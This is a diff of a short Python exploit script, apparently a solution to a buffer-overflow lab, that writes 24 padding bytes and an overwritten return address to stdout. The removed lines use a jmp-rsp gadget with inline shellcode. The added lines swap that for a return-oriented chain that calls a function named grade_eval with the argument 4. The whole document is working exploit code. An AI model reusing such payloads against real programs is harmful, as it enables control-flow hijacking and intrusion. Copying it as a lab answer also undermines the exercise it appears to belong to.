@@ -1,13 +1,13 @@
 import sys
 import struct
 
-jmp_rsp = 0x401e0b
-
-shellcode = b'\x31\xff' + b'\xff\xc7'*4 + b'\x68\x87\x1a\x40\x00' + b'\xc3'
+pop_rdi_ret = 0x401c93
+grade_eval  = 0x401a88 
 
 payload  = b'A' * 24
-payload += struct.pack('<Q', jmp_rsp)
-payload += shellcode
+payload += struct.pack('<Q', pop_rdi_ret)
+payload += struct.pack('<Q', 4)
+payload += struct.pack('<Q', grade_eval)
 payload += b'\n'
 
 sys.stdout.buffer.write(payload)
